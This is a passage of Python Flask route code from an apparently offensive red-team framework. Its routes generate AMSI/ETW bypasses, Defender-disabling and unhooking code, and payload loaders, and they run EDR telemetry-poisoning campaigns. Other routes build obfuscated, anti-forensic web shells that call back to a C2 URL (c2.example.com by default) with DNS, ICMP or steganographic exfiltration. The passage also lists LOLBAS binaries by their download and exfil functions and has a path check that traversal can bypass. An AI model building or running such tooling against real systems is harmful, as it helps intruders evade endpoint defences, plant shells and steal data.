        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    if session_id not in _sleep_obfuscators:
        return jsonify({
            'success': False,
            'error': 'Session not found'
        }), 404
    
    obf = _sleep_obfuscators[session_id]
    
    # Generate Python code for beacon integration
    config_code = f'''# AI-Adaptive Sleep Obfuscation Configuration
# Generated for session: {session_id}

from evasion.sleep_obfuscation import (
    AIAdaptiveSleepObfuscator,
    JitterPattern,
    EDRProduct
)

# Create obfuscator with exported settings
obfuscator = AIAdaptiveSleepObfuscator(
    base_sleep_ms={obf.base_sleep_ms},
    jitter_percent={obf.jitter_percent},
    pattern=JitterPattern.{obf.pattern.name},
    opsec_level={obf.opsec_level},
    auto_detect_edr=True
)

# Override EDR if detected: {obf.detected_edr}
# obfuscator.set_edr_override(EDRProduct.{obf._detected_edr.name})

# Usage in beacon loop:
# while beacon_active:
#     obfuscator.obfuscated_sleep()  # Auto-calculated duration
#     beacon_callback()

# Or with explicit duration:
# obfuscator.sleep(30000)  # 30 second sleep with obfuscation
'''
    
    return jsonify({
        'success': True,
        'session_id': session_id,
        'config_code': config_code,
        'config_json': {
            'base_sleep_ms': obf.base_sleep_ms,
            'jitter_percent': obf.jitter_percent,
            'pattern': obf.pattern.value,
            'opsec_level': obf.opsec_level,
            'detected_edr': obf.detected_edr
        }
    })


# ============================================================
# AMSI/ETW BYPASS PRO ROUTES
# ============================================================

# Import AMSI/ETW bypass module
try:
    from evasion.amsi_bypass import (
        AMSIETWBypassEngine,
        BypassTechnique,
        EDRProduct as AMSIEDRProduct,
        EDR_PROFILES as AMSI_EDR_PROFILES,
        create_bypass_engine,
        ai_bypass,
        ghost_bypass,
        fast_bypass,
        # Legacy classes
        AMSIBypass,
        ETWBypass,
        DefenderBypass,
    )
    HAS_AMSI_BYPASS = True
except ImportError as e:
    HAS_AMSI_BYPASS = False
    logger.warning(f"AMSI/ETW bypass module not available: {e}")


# Store bypass engine sessions
_bypass_engines = {}


@evasion_bp.route('/amsi/')
def amsi_bypass_page():
    """AMSI/ETW Bypass configuration page"""
    return render_template('amsi_bypass.html')


@evasion_bp.route('/amsi/status', methods=['GET'])
def amsi_status():
    """Get AMSI/ETW bypass module status"""
    return jsonify({
        'success': True,
        'available': HAS_AMSI_BYPASS,
        'techniques': [t.value for t in BypassTechnique] if HAS_AMSI_BYPASS else [],
        'edr_profiles': [e.value for e in AMSIEDRProduct] if HAS_AMSI_BYPASS else [],
        'active_sessions': len(_bypass_engines),
    })


@evasion_bp.route('/amsi/profiles', methods=['GET'])
def get_amsi_profiles():
    """Get available EDR profiles for bypass"""
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    profiles = {}
    for edr, profile in AMSI_EDR_PROFILES.items():
        profiles[edr.value] = {
            'name': profile.name,
            'hook_types': [h.value for h in profile.hook_types],
            'monitored_apis': profile.monitored_apis,
            'recommended_techniques': [t.value for t in profile.recommended_techniques],
            'syscall_monitoring': profile.syscall_monitoring,
            'detection_capabilities': profile.detection_capabilities
        }
    
    return jsonify({
        'success': True,
        'profiles': profiles,
        'techniques': {t.value: t.name for t in BypassTechnique}
    })


@evasion_bp.route('/amsi/generate', methods=['POST'])
def generate_bypass():
    """
    Generate AMSI/ETW bypass code
    
    JSON body:
    {
        "target": "amsi" | "etw" | "combined" | "unhook",
        "technique": "reflection" | "memory_patch" | etc,
        "edr_override": "falcon" | "defender" | null,
        "opsec_level": 1-4,
        "enable_mutation": true/false
    }
    """
    if not HAS_AMSI_BYPASS:
        return jsonify({
            'success': False,
            'error': 'AMSI/ETW bypass module not available'
        }), 503
    
    data = request.get_json()
    target = data.get('target', 'combined')
    technique_str = data.get('technique')
    edr_override = data.get('edr_override')
    opsec_level = data.get('opsec_level', 3)
    enable_mutation = data.get('enable_mutation', True)
    
    try:
        # Create engine
        engine = create_bypass_engine(
            edr=edr_override,
            opsec_level=opsec_level
        )
        engine.enable_mutation = enable_mutation
        
        # Parse technique if specified
        technique = None
        if technique_str:
            try:
                technique = BypassTechnique(technique_str)
            except ValueError:
                pass
        
        # Generate code based on target
        if target == 'amsi':
            code = engine.get_amsi_bypass(technique)
            bypass_type = 'AMSI Bypass'
        elif target == 'etw':
            code = engine.get_etw_bypass(technique)
            bypass_type = 'ETW Bypass'
        elif target == 'unhook':
            code = engine.get_unhook()
            bypass_type = 'NTDLL Unhook'
        else:  # combined
            code = engine.get_combined_bypass()
            bypass_type = 'Combined AI-Dynamic Bypass'
        
        return jsonify({
            'success': True,
            'bypass_type': bypass_type,
            'target': target,
            'technique': technique.value if technique else 'ai_selected',
            'detected_edr': engine.detected_edr,
            'opsec_level': opsec_level,
            'code': code,
            'code_length': len(code),
            'recommended': engine.get_bypass_status()['recommended_techniques']
        })
    except Exception as e:
        logger.error(f"Failed to generate bypass: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 400


@evasion_bp.route('/amsi/quick/<preset>', methods=['GET'])
def quick_bypass(preset: str):
    """
    Get quick bypass by preset name
    
    Presets: ai, ghost, fast
    """
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    presets = {
        'ai': ai_bypass,
        'ghost': ghost_bypass,
        'fast': fast_bypass
    }
    
    if preset not in presets:
        return jsonify({
            'success': False,
            'error': f"Unknown preset. Available: {list(presets.keys())}"
        }), 400
    
    try:
        code = presets[preset]()
        return jsonify({
            'success': True,
            'preset': preset,
            'code': code,
            'code_length': len(code)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/amsi/session', methods=['POST'])
def create_bypass_session():
    """
    Create persistent bypass session
    
    JSON body:
    {
        "session_id": "beacon_001",
        "edr_override": "falcon",
        "opsec_level": 3
    }
    """
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    data = request.get_json()
    session_id = data.get('session_id', f"amsi_{int(datetime.now().timestamp())}")
    
    try:
        engine = create_bypass_engine(
            edr=data.get('edr_override'),
            opsec_level=data.get('opsec_level', 3)
        )
        
        _bypass_engines[session_id] = engine
        
        return jsonify({
            'success': True,
            'session_id': session_id,
            'status': engine.get_bypass_status()
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 400


@evasion_bp.route('/amsi/sessions', methods=['GET'])
def list_bypass_sessions():
    """List all bypass sessions"""
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    sessions = []
    for sid, engine in _bypass_engines.items():
        sessions.append({
            'session_id': sid,
            'detected_edr': engine.detected_edr,
            'opsec_level': engine.opsec_level,
            'status': engine.get_bypass_status()
        })
    
    return jsonify({
        'success': True,
        'sessions': sessions,
        'count': len(sessions)
    })


@evasion_bp.route('/amsi/session/<session_id>', methods=['DELETE'])
def delete_bypass_session(session_id: str):
    """Delete a bypass session"""
    if session_id in _bypass_engines:
        del _bypass_engines[session_id]
        return jsonify({'success': True, 'message': f'Session {session_id} deleted'})
    return jsonify({'success': False, 'error': 'Session not found'}), 404


@evasion_bp.route('/amsi/legacy/<technique>', methods=['GET'])
def legacy_bypass(technique: str):
    """
    Get legacy bypass code (backward compatibility)
    
    Techniques: reflection, memory_patch, context, clr, etw_patch, etw_provider
    """
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    legacy_map = {
        'reflection': AMSIBypass.get_reflection_bypass,
        'memory_patch': AMSIBypass.get_memory_patch_bypass,
        'context': AMSIBypass.get_context_corruption_bypass,
        'clr': AMSIBypass.get_clr_bypass,
        'etw_patch': ETWBypass.get_etw_patch,
        'etw_provider': ETWBypass.get_etw_provider_bypass,
        'defender_enum': DefenderBypass.get_defender_exclusion_enum,
        'defender_disable': DefenderBypass.get_defender_disable,
    }
    
    if technique not in legacy_map:
        return jsonify({
            'success': False,
            'error': f"Unknown technique. Available: {list(legacy_map.keys())}"
        }), 400
    
    try:
        code = legacy_map[technique]()
        return jsonify({
            'success': True,
            'technique': technique,
            'code': code
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/amsi/loader', methods=['POST'])
def generate_bypass_loader():
    """
    Generate bypass loader for payload
    
    JSON body:
    {
        "payload": "Write-Host 'Hello'",
        "opsec_level": 3,
        "obfuscate": true
    }
    """
    if not HAS_AMSI_BYPASS:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    data = request.get_json()
    payload = data.get('payload', "Write-Host '[+] Payload executed successfully'")
    opsec_level = data.get('opsec_level', 3)
    obfuscate = data.get('obfuscate', False)
    
    try:
        from evasion.amsi_bypass import generate_bypass_loader, get_obfuscated_bypass
        
        if obfuscate:
            loader = get_obfuscated_bypass()
            loader += f"\n\n# Payload\n{payload}"
        else:
            loader = generate_bypass_loader(payload)
        
        return jsonify({
            'success': True,
            'loader': loader,
            'loader_length': len(loader),
            'obfuscated': obfuscate
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
# EDR TELEMETRY POISONING
# ============================================================

# Try to import EDR Poison module
EDR_POISON_AVAILABLE = False
_edr_poison_api = None

def _get_edr_poison_api():
    """Get or create EDR Poison API instance"""
    global EDR_POISON_AVAILABLE, _edr_poison_api
    if _edr_poison_api is None:
        try:
            import sys
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'evasion'))
            from edr_poison import get_edr_poison_api
            _edr_poison_api = get_edr_poison_api()
            EDR_POISON_AVAILABLE = True
        except Exception as e:
            logger.warning(f"EDR Poison import failed: {e}")
            EDR_POISON_AVAILABLE = False
    return _edr_poison_api


@evasion_bp.route('/edr-poison')
def edr_poison_page():
    """EDR Telemetry Poisoning page"""
    return render_template('edr_poison.html')


@evasion_bp.route('/api/edr-poison/status')
def edr_poison_status():
    """Get EDR Poison module status"""
    api = _get_edr_poison_api()
    return jsonify({
        'success': True,
        'available': api is not None,
        'module': 'edr_poison',
        'features': {
            'noise_generator': True,
            'campaigns': True,
            'edr_patterns': True,
            'script_generator': True
        }
    })


@evasion_bp.route('/api/edr-poison/generate', methods=['POST'])
def edr_poison_generate():
    """Generate instant noise burst"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'EDR Poison module not available'}), 503
    
    data = request.get_json() or {}
    
    try:
        result = api.generate_instant_noise(
            categories=data.get('categories', ['discovery', 'credential_access']),
            intensity=data.get('intensity', 'medium'),
            target_edr=data.get('target_edr', 'generic')
        )
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/campaign/create', methods=['POST'])
def edr_poison_create_campaign():
    """Create a new poisoning campaign"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'EDR Poison module not available'}), 503
    
    data = request.get_json() or {}
    
    try:
        result = api.create_campaign(
            name=data.get('name', 'Untitled Campaign'),
            target_edr=data.get('target_edr', 'generic'),
            intensity=data.get('intensity', 'medium'),
            categories=data.get('categories'),
            duration_minutes=data.get('duration_minutes', 30)
        )
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/campaign/<campaign_id>/start', methods=['POST'])
def edr_poison_start_campaign(campaign_id):
    """Start a poisoning campaign"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        result = api.start_campaign(campaign_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/campaign/<campaign_id>/stop', methods=['POST'])
def edr_poison_stop_campaign(campaign_id):
    """Stop a poisoning campaign"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        result = api.stop_campaign(campaign_id)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/campaigns')
def edr_poison_list_campaigns():
    """List all campaigns"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        result = api.list_campaigns()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/stats')
def edr_poison_stats():
    """Get poisoning statistics"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({
            'success': True,
            'total_events': 0,
            'by_category': {},
            'by_severity': {},
            'active_campaigns': 0,
            'total_campaigns': 0
        })
    
    try:
        result = api.get_statistics()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/patterns/<edr>/<category>')
def edr_poison_patterns(edr, category):
    """Get EDR-specific patterns"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        result = api.get_edr_specific_payload(edr, category)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/export')
def edr_poison_export():
    """Export generated events"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    format = request.args.get('format', 'json')
    
    try:
        data = api.export_events(format=format)
        return data, 200, {'Content-Type': 'application/json' if format == 'json' else 'text/csv'}
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/edr-poison/clear', methods=['POST'])
def edr_poison_clear():
    """Clear all generated events"""
    api = _get_edr_poison_api()
    if not api:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        result = api.clear_events()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
# PURPLE TEAM VALIDATOR
# ============================================================

PURPLE_TEAM_AVAILABLE = False
_purple_team_validator = None

def _get_purple_team_validator():
    """Get or create Purple Team Validator instance"""
    global PURPLE_TEAM_AVAILABLE, _purple_team_validator
    if _purple_team_validator is None:
        try:
            from tools.purple_team_validator import PurpleTeamValidator
            _purple_team_validator = PurpleTeamValidator()
            PURPLE_TEAM_AVAILABLE = True
        except Exception as e:
            logger.warning(f"Purple Team Validator import failed: {e}")
            PURPLE_TEAM_AVAILABLE = False
    return _purple_team_validator


@evasion_bp.route('/purple-team')
def purple_team_page():
    """Purple Team Validator page"""
    return render_template('purple_team.html')


@evasion_bp.route('/api/purple-team/status')
def purple_team_status():
    """Get Purple Team Validator status"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({
            'success': False,
            'available': False,
            'error': 'Purple Team module not available'
        })
    
    try:
        status = validator.get_campaign_status()
        return jsonify({
            'success': True,
            'available': True,
            **status
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/tests')
def purple_team_tests():
    """Get available test library"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        tests = validator.get_available_tests()
        coverage = validator.get_technique_coverage()
        return jsonify({
            'success': True,
            'tests': tests,
            'coverage': coverage
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/campaign/create', methods=['POST'])
def purple_team_create_campaign():
    """Create a new validation campaign"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        data = request.get_json() or {}
        
        campaign_id = validator.create_campaign(
            name=data.get('name', 'Purple Team Validation'),
            target_environment=data.get('target_environment', 'Production'),
            edr_vendors=data.get('edr_vendors'),
            tactics=data.get('tactics'),
            techniques=data.get('techniques')
        )
        
        return jsonify({
            'success': True,
            'campaign_id': campaign_id,
            'message': 'Campaign created successfully'
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/campaign/<campaign_id>/run', methods=['POST'])
def purple_team_run_campaign(campaign_id):
    """Run a validation campaign"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        data = request.get_json() or {}
        simulate = data.get('simulate', True)
        
        report = validator.run_campaign(
            campaign_id=campaign_id,
            simulate=simulate
        )
        
        # Convert report to dict for JSON serialization
        report_dict = {
            'report_id': report.report_id,
            'campaign_name': report.campaign_name,
            'start_time': report.start_time.isoformat(),
            'end_time': report.end_time.isoformat() if report.end_time else None,
            'target_environment': report.target_environment,
            'edr_vendors': report.edr_vendors,
            'total_tests': report.total_tests,
            'tests_executed': report.tests_executed,
            'tests_passed': report.tests_passed,
            'tests_failed': report.tests_failed,
            'detection_rate': report.detection_rate,
            'evasion_rate': report.evasion_rate,
            'mitre_coverage': report.mitre_coverage,
            'ai_recommendations': report.ai_recommendations,
            'executive_summary': report.executive_summary,
            'test_results': [
                {
                    'test_id': r.test_id,
                    'test_name': r.test_name,
                    'technique_id': r.technique_id,
                    'technique_name': r.technique_name,
                    'tactic': r.tactic,
                    'detection_result': r.detection_result.value,
                    'duration_ms': r.duration_ms,
                }
                for r in report.test_results
            ],
            'detection_gaps': [
                {
                    'gap_id': g.gap_id,
                    'technique_id': g.technique_id,
                    'technique_name': g.technique_name,
                    'severity': g.severity.value,
                    'description': g.description,
                    'recommendation': g.recommendation,
                    'remediation_steps': g.remediation_steps,
                }
                for g in report.detection_gaps
            ]
        }
        
        return jsonify({
            'success': True,
            'report': report_dict
        })
    except Exception as e:
        logger.error(f"Error running campaign: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/quick-assessment', methods=['POST'])
def purple_team_quick_assessment():
    """Run a quick assessment"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        data = request.get_json() or {}
        techniques = data.get('techniques')
        
        result = validator.run_quick_assessment(techniques=techniques)
        
        return jsonify({
            'success': True,
            'result': result
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/report/generate', methods=['POST'])
def purple_team_generate_report():
    """Generate reports for a campaign"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        data = request.get_json() or {}
        campaign_id = data.get('campaign_id')
        formats = data.get('formats', ['html', 'json'])
        
        files = validator.generate_reports(campaign_id=campaign_id, formats=formats)
        
        return jsonify({
            'success': True,
            'files': files
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/purple-team/report/view')
def purple_team_view_report():
    """View a generated HTML report"""
    path = request.args.get('path')
    if not path:
        return "No path specified", 400
    
    # Security check - only allow files from purple reports directory
    if not path.startswith('/tmp/purple_reports/'):
        return "Access denied", 403
    
    try:
        with open(path, 'r') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/html'}
    except FileNotFoundError:
        return "Report not found", 404
    except Exception as e:
        return str(e), 500


@evasion_bp.route('/api/purple-team/export')
def purple_team_export():
    """Export campaign data"""
    validator = _get_purple_team_validator()
    if not validator:
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    try:
        campaign_id = request.args.get('campaign_id')
        data = validator.export_campaign_data(campaign_id=campaign_id)
        
        return jsonify({
            'success': True,
            'data': data
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
# WEB SHELL ENHANCER - POST-WEB EXPLOITATION
# ============================================================

# Lazy import for Web Shell Enhancer
WEBSHELL_ENHANCER_AVAILABLE = False
WebShellEnhancer = None
WebShellConfig = None
WebShellType = None
ExfilMethod = None

def _lazy_import_webshell_enhancer():
    """Lazy import Web Shell Enhancer module"""
    global WEBSHELL_ENHANCER_AVAILABLE, WebShellEnhancer, WebShellConfig, WebShellType, ExfilMethod
    if WebShellEnhancer is None:
        try:
            from evasion.web_shell_enhancer import (
                WebShellEnhancer as _WebShellEnhancer,
                WebShellConfig as _WebShellConfig,
                WebShellType as _WebShellType,
                ExfilMethod as _ExfilMethod,
            )
            WebShellEnhancer = _WebShellEnhancer
            WebShellConfig = _WebShellConfig
            WebShellType = _WebShellType
            ExfilMethod = _ExfilMethod
            WEBSHELL_ENHANCER_AVAILABLE = True
        except Exception as e:
            logger.warning(f"Web Shell Enhancer import failed: {e}")
            WEBSHELL_ENHANCER_AVAILABLE = False
    return WEBSHELL_ENHANCER_AVAILABLE

# Global Web Shell Enhancer instance
_webshell_enhancer = None

def _get_webshell_enhancer():
    """Get or create Web Shell Enhancer instance"""
    global _webshell_enhancer
    if not _lazy_import_webshell_enhancer():
        return None
    if _webshell_enhancer is None and WebShellEnhancer is not None:
        _webshell_enhancer = WebShellEnhancer()
    return _webshell_enhancer


@evasion_bp.route('/webshell-enhancer')
def webshell_enhancer_page():
    """Web Shell Enhancer - Post-Web Exploitation page"""
    _lazy_import_webshell_enhancer()
    return render_template('webshell_enhancer.html',
        available=WEBSHELL_ENHANCER_AVAILABLE,
        now=datetime.now().strftime('%H:%M:%S')
    )


@evasion_bp.route('/api/webshell-enhancer/types')
def webshell_types():
    """Get available shell types"""
    if not _lazy_import_webshell_enhancer():
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    enhancer = _get_webshell_enhancer()
    if not enhancer:
        return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    
    types = enhancer.get_shell_types()
    return jsonify({'success': True, 'types': types})


@evasion_bp.route('/api/webshell-enhancer/exfil-methods')
def webshell_exfil_methods():
    """Get available exfiltration methods"""
    if not _lazy_import_webshell_enhancer():
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    enhancer = _get_webshell_enhancer()
    if not enhancer:
        return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    
    methods = enhancer.get_exfil_methods()
    return jsonify({'success': True, 'methods': methods})


@evasion_bp.route('/api/webshell-enhancer/generate', methods=['POST'])
def webshell_generate():
    """
    Generate enhanced web shell
    
    Request (JSON):
        shell_type: php, asp, aspx, jsp, python, node
        callback_url: C2 callback URL
        encryption_key: Optional encryption key (auto-generated if not provided)
        memory_only: Boolean - diskless shell
        auto_upgrade: Boolean - auto-upgrade to beacon
        exfil_method: http_chunked, dns_tunnel, websocket, icmp_covert, steganography
    """
    if not _lazy_import_webshell_enhancer():
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    enhancer = _get_webshell_enhancer()
    if not enhancer:
        return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    
    data = request.get_json() or {}
    
    # Parse shell type
    shell_type_str = data.get('shell_type', 'php').upper()
    try:
        shell_type = WebShellType[shell_type_str]
    except KeyError:
        shell_type = WebShellType.PHP
    
    # Parse exfil method
    exfil_method_str = data.get('exfil_method', 'http_chunked').upper()
    try:
        exfil_method = ExfilMethod[exfil_method_str]
    except KeyError:
        exfil_method = ExfilMethod.HTTP_CHUNKED
    
    # Build config
    config = WebShellConfig(
        shell_type=shell_type,
        callback_url=data.get('callback_url', 'https://c2.example.com'),
        encryption_key=data.get('encryption_key') or None,
        memory_only=data.get('memory_only', True),
        auto_upgrade=data.get('auto_upgrade', True),
        exfil_method=exfil_method
    )
    
    try:
        shell = enhancer.create_enhanced_shell(config)
        
        return jsonify({
            'success': True,
            'shell': {
                'id': shell.get('id'),
                'type': shell.get('type'),
                'loader': shell.get('loader'),
                'payload': shell.get('payload'),
                'recon_payload': shell.get('recon_payload'),
                'harvester_payload': shell.get('harvester_payload'),
                'beacon_upgrade': shell.get('beacon_upgrade'),
                'config': {
                    'callback_url': config.callback_url,
                    'memory_only': config.memory_only,
                    'auto_upgrade': config.auto_upgrade,
                    'exfil_method': config.exfil_method.name
                }
            }
        })
    except Exception as e:
        logger.exception("Web shell generation error")
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/webshell-enhancer/simulate', methods=['POST'])
def webshell_simulate():
    """
    Simulate web shell execution
    
    Request (JSON):
        shell_id: ID of generated shell
        action: exec, recon, harvest, exfil, upgrade
        params: Optional parameters (e.g., cmd for exec)
    """
    if not _lazy_import_webshell_enhancer():
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    enhancer = _get_webshell_enhancer()
    if not enhancer:
        return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    
    data = request.get_json() or {}
    shell_id = data.get('shell_id')
    action = data.get('action', 'exec')
    params = data.get('params', {})
    
    try:
        result = enhancer.simulate_shell_execution(
            shell_id=shell_id,
            action=action,
            params=params
        )
        
        return jsonify({
            'success': True,
            'simulation': result
        })
    except Exception as e:
        logger.exception("Web shell simulation error")
        return jsonify({'success': False, 'error': str(e)}), 500


@evasion_bp.route('/api/webshell-enhancer/stats')
def webshell_stats():
    """Get Web Shell Enhancer statistics"""
    if not _lazy_import_webshell_enhancer():
        return jsonify({'success': False, 'error': 'Module not available'}), 503
    
    enhancer = _get_webshell_enhancer()
    if not enhancer:
        return jsonify({'success': False, 'error': 'Failed to initialize'}), 500
    
    stats = enhancer.get_stats()
    return jsonify({'success': True, 'stats': stats})


@evasion_bp.route('/api/webshell-enhancer/test-connection', methods=['POST'])
def webshell_test_connection():
    """
    Test shell connection (simulation)
    
    Request (JSON):
        target_url: URL where shell is deployed
        shell_type: Type of shell
    """
    data = request.get_json() or {}
    target_url = data.get('target_url', '')
    shell_type = data.get('shell_type', 'php')
    
    # Simulated connection test
    import random
    
    result = {
        'target_url': target_url,
        'shell_type': shell_type,
        'connection_test': {
            'status': 'simulated',
            'latency_ms': random.randint(50, 200),
            'response_code': 200,
            'server_info': 'Apache/2.4.41 (Ubuntu)',
            'php_version': '7.4.3' if shell_type == 'php' else None
        },
        'security_check': {
            'waf_detected': random.choice([True, False]),
            'av_detected': False,
            'sandbox_detected': False
        }
    }
    
    return jsonify({'success': True, 'result': result})


# ============================================================
# WEB SHELL OBFUSCATOR
# ============================================================

# Lazy import for web obfuscator
_web_obfuscator = None

def _get_web_obfuscator():
    """Get or create web obfuscator instance"""
    global _web_obfuscator
    if _web_obfuscator is None:
        try:
            from evasion.web_obfuscator import get_web_obfuscator
            _web_obfuscator = get_web_obfuscator()
        except Exception as e:
            logger.warning(f"Web obfuscator import failed: {e}")
            return None
    return _web_obfuscator


@evasion_bp.route('/web-obfuscator')
def web_obfuscator_page():
    """Web Shell Obfuscator page"""
    return render_template('web_obfuscator.html')


@evasion_bp.route('/api/obfuscator/techniques')
def obfuscator_techniques():
    """Get available obfuscation techniques"""
    obfuscator = _get_web_obfuscator()
    if not obfuscator:
        return jsonify([])
    return jsonify(obfuscator.get_techniques())


@evasion_bp.route('/api/obfuscator/anti-forensic')
def obfuscator_anti_forensic():
    """Get anti-forensic techniques"""
    obfuscator = _get_web_obfuscator()
    if not obfuscator:
        return jsonify([])
    return jsonify(obfuscator.get_anti_forensic_techniques())


@evasion_bp.route('/api/obfuscator/languages')
def obfuscator_languages():
    """Get supported languages"""
    obfuscator = _get_web_obfuscator()
    if not obfuscator:
        return jsonify([])
    return jsonify(obfuscator.get_languages())


@evasion_bp.route('/api/obfuscator/obfuscate', methods=['POST'])
def obfuscator_obfuscate():
    """Obfuscate code"""
    obfuscator = _get_web_obfuscator()
    if not obfuscator:
        return jsonify({'error': 'Module not available'}), 503
    
    data = request.get_json() or {}
    code = data.get('code', '')
    config_data = data.get('config', {})
    
    if not code:
        return jsonify({'error': 'No code provided'}), 400
    
    try:
        from evasion.web_obfuscator import (
            ObfuscationConfig, ShellLanguage, ObfuscationLevel,
            ObfuscationTechnique, AntiForensicTechnique
        )
        
        # Build config
        config = ObfuscationConfig(
            language=ShellLanguage(config_data.get('language', 'php')),
            level=ObfuscationLevel(config_data.get('level', 2))
        )
        
        # Add techniques
        if config_data.get('techniques'):
            config.techniques = [
                ObfuscationTechnique(t) for t in config_data['techniques']
                if t in [e.value for e in ObfuscationTechnique]
            ]
        
        # Add anti-forensic
        if config_data.get('anti_forensic'):
            config.anti_forensic = [
                AntiForensicTechnique(t) for t in config_data['anti_forensic']
                if t in [e.value for e in AntiForensicTechnique]
            ]
        
        result = obfuscator.obfuscate(code, config)
        
        return jsonify({
            'obfuscated_code': result.obfuscated_code,
            'original_size': result.original_size,
            'obfuscated_size': result.obfuscated_size,
            'techniques_applied': result.techniques_applied,
            'checksum': result.checksum
        })
        
    except Exception as e:
        logger.exception("Obfuscation error")
        return jsonify({'error': str(e)}), 500


@evasion_bp.route('/api/obfuscator/stats')
def obfuscator_stats():
    """Get obfuscator statistics"""
    obfuscator = _get_web_obfuscator()
    if not obfuscator:
        return jsonify({})
    return jsonify(obfuscator.get_stats())


# ============================================================
# LIVING OFF THE LAND (LOTL)
# ============================================================

@evasion_bp.route('/lotl/')
def lotl_page():
    """Living Off The Land execution page"""
    return render_template('lotl.html')


@evasion_bp.route('/api/lotl/binaries')
def lotl_binaries():
    """Get LOLBAS/GTFOBins list"""
    binaries = [
        {'name': 'certutil.exe', 'os': 'windows', 'functions': ['download', 'encode', 'decode'], 'risk': 'high'},
        {'name': 'bitsadmin.exe', 'os': 'windows', 'functions': ['download', 'execute'], 'risk': 'high'},
        {'name': 'mshta.exe', 'os': 'windows', 'functions': ['execute', 'proxy'], 'risk': 'critical'},
        {'name': 'rundll32.exe', 'os': 'windows', 'functions': ['execute', 'proxy'], 'risk': 'high'},
        {'name': 'regsvr32.exe', 'os': 'windows', 'functions': ['execute', 'bypass'], 'risk': 'high'},
        {'name': 'wmic.exe', 'os': 'windows', 'functions': ['execute', 'recon'], 'risk': 'high'},
        {'name': 'powershell.exe', 'os': 'windows', 'functions': ['execute', 'download', 'encode'], 'risk': 'critical'},
        {'name': 'curl', 'os': 'linux', 'functions': ['download', 'upload', 'exfil'], 'risk': 'medium'},
